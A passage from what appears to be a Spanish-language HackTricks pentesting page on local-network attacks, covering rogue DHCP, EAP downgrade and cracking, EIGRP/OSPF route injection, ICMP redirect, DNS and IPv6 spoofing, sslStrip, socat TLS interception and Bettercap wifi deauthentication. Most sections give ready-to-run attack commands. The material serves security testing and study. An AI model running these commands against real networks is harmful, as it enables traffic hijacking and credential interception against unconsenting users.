| Dirección IP del servidor DNS secundario (opcional) | _-s 10.0.0.1_                                                                |
| La máscara de red de la red local           | _-n 255.255.255.0_                                                           |
| La interfaz para escuchar el tráfico DHCP en | _-I eth1_                                                                    |
| Dirección de configuración de WPAD (URL)    | _-w “[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Falsificar la dirección IP de la puerta de enlace predeterminada | -S                                                                           |
| Responder a todas las solicitudes DHCP (muy ruidoso) | -R                                                                           |

### **Ataques EAP**

Aquí hay algunas tácticas de ataque que se pueden utilizar contra implementaciones 802.1X:

* Fuerza bruta activa de contraseñas a través de EAP
* Atacar el servidor RADIUS con contenido EAP malformado _\*\*_(exploits)
* Captura de mensajes EAP y craqueo de contraseñas sin conexión (EAP-MD5 y PEAP)
* Forzar la autenticación EAP-MD5 para evitar la validación del certificado TLS
* Inyectar tráfico de red malicioso al autenticar usando un concentrador o similar

Si el atacante está entre la víctima y el servidor de autenticación, podría intentar degradar (si es necesario) el protocolo de autenticación a EAP-MD5 y capturar el intento de autenticación. Luego, podría realizar fuerza bruta en esto utilizando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Ataques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (Protocolo de Redundancia del Primer Salto) es una clase de protocolos de red diseñados para **crear un sistema de enrutamiento redundante en caliente**. Con FHRP, los enrutadores físicos pueden combinarse en un único dispositivo lógico, lo que aumenta la tolerancia a fallos y ayuda a distribuir la carga.

**Los ingenieros de Cisco Systems han desarrollado dos protocolos FHRP, GLBP y HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Existen tres versiones del Protocolo de Información de Enrutamiento (RIP): RIP, RIPv2 y RIPng. RIP y RIPv2 utilizan datagramas UDP enviados a pares a través del puerto 520, mientras que RIPng transmite datagramas al puerto UDP 521 a través de multicast IPv6. RIPv2 introdujo el soporte de autenticación MD5. RIPng no incorpora autenticación nativa; en su lugar, se basa en los encabezados IPsec AH y ESP opcionales dentro de IPv6.

Para obtener más información sobre cómo atacar este protocolo, consulta el libro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Ataques EIGRP

**EIGRP (Protocolo de Enrutamiento de Puerta de Enlace Interior Mejorado)** es un protocolo de enrutamiento dinámico. **Es un protocolo de vector de distancia.** Si no hay **autenticación** y configuración de interfaces pasivas, un **intruso** puede interferir con el enrutamiento EIGRP y causar **envenenamiento de tablas de enrutamiento**. Además, la red EIGRP (es decir, sistema autónomo) **es plana y no tiene segmentación en zonas**. Si un **atacante inyecta una ruta**, es probable que esta ruta se **propague** por todo el sistema autónomo EIGRP.

Atacar un sistema EIGRP requiere **establecer una vecindad con un enrutador EIGRP legítimo**, lo que abre muchas posibilidades, desde reconocimiento básico hasta diversas inyecciones.

\*\*\*\*[**FRRouting**](https://frrouting.org/) te permite implementar **un enrutador virtual que admite BGP, OSPF, EIGRP, RIP y otros protocolos.** Todo lo que necesitas hacer es implementarlo en el sistema del atacante y realmente puedes fingir ser un enrutador legítimo en el dominio de enrutamiento.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) también admite la captura de difusiones EIGRP e inyección de paquetes para manipular la configuración de enrutamiento. Para obtener más información sobre cómo atacarlo con Coly, consulta _**Network Security Assessment: Know Your Network (3rd edition).**_

### OSPF

La mayoría de las implementaciones de Open Shortest Path First (OSPF) utilizan MD5 para proporcionar autenticación entre enrutadores. Loki y John the Ripper pueden capturar y atacar hashes MD5 para revelar la clave, que luego se puede utilizar para anunciar nuevas rutas. Los parámetros de ruta se establecen utilizando la pestaña _Injection_, y la clave se establece en _Connection_.

Para obtener más información sobre cómo atacar este protocolo, consulta el libro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Otras Herramientas y Fuentes Genéricas

* [**Above**](https://github.com/c4s73r/Above): Herramienta para escanear el tráfico de red y encontrar vulnerabilidades
* Puedes encontrar más información sobre ataques de red [aquí](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Leer todo y todos los nuevos ataques si los hay)_ 

## **Suplantación**

El atacante configura todos los parámetros de red (GW, IP, DNS) del nuevo miembro de la red enviando respuestas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Consulta la [sección anterior](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste en enviar un paquete ICMP tipo 1 código 5 que indica que el atacante es la mejor manera de llegar a una IP. Entonces, cuando la víctima quiera contactar con la IP, enviará el paquete a través del atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### Suplantación de DNS

El atacante resolverá algunos (o todos) los dominios que solicite la víctima.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar tu propio DNS con dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Pasarelas locales

A menudo existen múltiples rutas a sistemas y redes. Al construir una lista de direcciones MAC dentro de la red local, utiliza _gateway-finder.py_ para identificar hosts que admiten reenvío de IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Suplantación de LLMNR, NBT-NS y mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Los sistemas de Microsoft utilizan la Resolución de Nombres Multicast de Ámbito Local (LLMNR) y el Servicio de Nombres NetBIOS (NBT-NS) para la resolución local de host cuando fallan las búsquedas de DNS. Apple Bonjour y las implementaciones de configuración cero de Linux utilizan el Servicio de Nombres Multicast (mDNS) para descubrir sistemas dentro de una red. Estos protocolos no están autenticados y envían mensajes por UDP; por lo tanto, los atacantes pueden explotarlos para dirigir a los usuarios a servicios maliciosos.

Puedes suplantar servicios que son buscados por los hosts utilizando Responder para enviar respuestas falsas.\
Lee aquí más información sobre [cómo suplantar servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Suplantación de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Muchos navegadores utilizan el Descubrimiento Automático de Proxy Web (WPAD) para cargar la configuración de proxy desde la red. Un servidor WPAD proporciona la configuración de proxy del cliente a través de una URL específica (por ejemplo, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) al ser identificado a través de cualquiera de los siguientes métodos:

* DHCP, utilizando una entrada de código 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, buscando el nombre de host _wpad_ en el dominio local
* Microsoft LLMNR y NBT-NS (en caso de fallo en la búsqueda de DNS)

Responder automatiza el ataque de WPAD—ejecutando un proxy y dirigiendo a los clientes a un servidor WPAD malicioso a través de DHCP, DNS, LLMNR y NBT-NS.\
Lee aquí más información sobre [cómo suplantar servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Suplantación de dispositivos SSDP y UPnP](spoofing-ssdp-and-upnp-devices.md)

Puedes ofrecer diferentes servicios en la red para intentar **engañar a un usuario** para que ingrese algunas **credenciales en texto plano**. **Más información sobre este ataque en** [**Suplantación de dispositivos SSDP y UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Suplantación de Vecino IPv6

Este ataque es muy similar al ARP Spoofing pero en el mundo IPv6. Puedes hacer que la víctima piense que la dirección IPv6 de la puerta de enlace tiene la dirección MAC del atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Suplantación/Inundación de Anuncios de Router IPv6

Algunos sistemas operativos configuran por defecto la puerta de enlace a partir de los paquetes RA enviados en la red. Para declarar al atacante como router IPv6, puedes usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Suplantación de DHCP IPv6

Por defecto, algunos sistemas operativos intentan configurar el DNS leyendo un paquete DHCPv6 en la red. Por lo tanto, un atacante podría enviar un paquete DHCPv6 para configurarse a sí mismo como DNS. El DHCP también proporciona una dirección IPv6 a la víctima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (página falsa e inyección de código JS)

## Ataques en Internet

### sslStrip

Básicamente lo que hace este ataque es, en caso de que el **usuario** intente **acceder** a una página **HTTP** que está **redirigiendo** a la versión **HTTPS**. **sslStrip** mantendrá una **conexión HTTP con** el **cliente y una conexión HTTPS con** el **servidor** para poder **husmear** la conexión en **texto plano**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Más información [aquí](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ y dns2proxy para evadir HSTS

La **diferencia** entre **sslStrip+ y dns2proxy** frente a **sslStrip** es que **redirigirán** por ejemplo _**www.facebook.com**_ **a** _**wwww.facebook.com**_ (nota la **"w" extra**) y establecerán la **dirección de este dominio como la IP del atacante**. De esta manera, el **cliente** se **conectará** a _**wwww.facebook.com**_ **(el atacante)** pero detrás de escena **sslstrip+** **mantendrá** la **conexión real** a través de https con **www.facebook.com**.

El **objetivo** de esta técnica es **evitar HSTS** porque _**wwww**.facebook.com_ **no** se guardará en la **caché** del navegador, por lo que se engañará al navegador para realizar **autenticación de Facebook en HTTP**.\
Ten en cuenta que para llevar a cabo este ataque, la víctima debe intentar acceder inicialmente a [http://www.faceook.com](http://www.faceook.com) y no https. Esto se puede hacer modificando los enlaces dentro de una página http.

Más información [aquí](https://www.bettercap.org/legacy/#hsts-bypass), [aquí](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) y [aquí](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip o sslStrip+ ya no funcionan. Esto se debe a que hay reglas HSTS preguardadas en los navegadores, por lo que incluso si es la primera vez que un usuario accede a un dominio "importante", lo hará a través de HTTPS. Además, ten en cuenta que las reglas preguardadas y otras reglas generadas pueden usar la bandera** [**`includeSubdomains`**](https://hstspreload.appspot.com) **por lo que el ejemplo de** _**wwww.facebook.com**_ **anterior ya no funcionará, ya que** _**facebook.com**_ **utiliza HSTS con `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Escuchar TCP en puerto
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Escuchar TCP + SSL en el puerto

#### Generar claves y certificado autofirmado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escuchar usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escuchar usando certificado y redirigir a los hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A veces, si el cliente comprueba que la CA es válida, podrías **servir un certificado de otro nombre de host firmado por una CA**.\
Otra prueba interesante es servir un **certificado del nombre de host solicitado pero autofirmado**.

Otras cosas para probar son intentar firmar el certificado con un certificado válido que no sea una CA válida. O utilizar la clave pública válida, forzar el uso de un algoritmo como diffie hellman (uno que no necesite descifrar nada con la clave privada real) y cuando el cliente solicite una sonda de la clave privada real (como un hash) enviar una sonda falsa y esperar que el cliente no lo compruebe.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descubrimiento Activo

Ten en cuenta que cuando se envía un paquete UDP a un dispositivo que no tiene el puerto solicitado, se envía un ICMP (Puerto Inalcanzable).

### **Descubrimiento ARP**

Los paquetes ARP se utilizan para descubrir qué IPs se están utilizando dentro de la red. La PC debe enviar una solicitud para cada dirección IP posible y solo responderán las que se estén utilizando.

### **mDNS (multicast DNS)**

Bettercap envía una solicitud mDNS (cada X ms) pidiendo **\_services\_.dns-sd.\_udp.local**. La máquina que ve este paquete generalmente responde a esta solicitud. Luego, solo busca máquinas que respondan a "services".

**Herramientas**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (Servidor de Nombres NetBios)**

Bettercap envía paquetes de difusión al puerto 137/UDP pidiendo el nombre "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Protocolo de Descubrimiento de Servicios Simples)**

Bettercap envía paquetes SSDP de difusión buscando todo tipo de servicios (Puerto UDP 1900).

### **WSD (Descubrimiento de Servicios Web)**

Bettercap envía paquetes WSD de difusión buscando servicios (Puerto UDP 3702).

## Referencias

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo de recompensa por errores**: **Regístrate** en **Intigriti**, una plataforma de **recompensas por errores premium creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
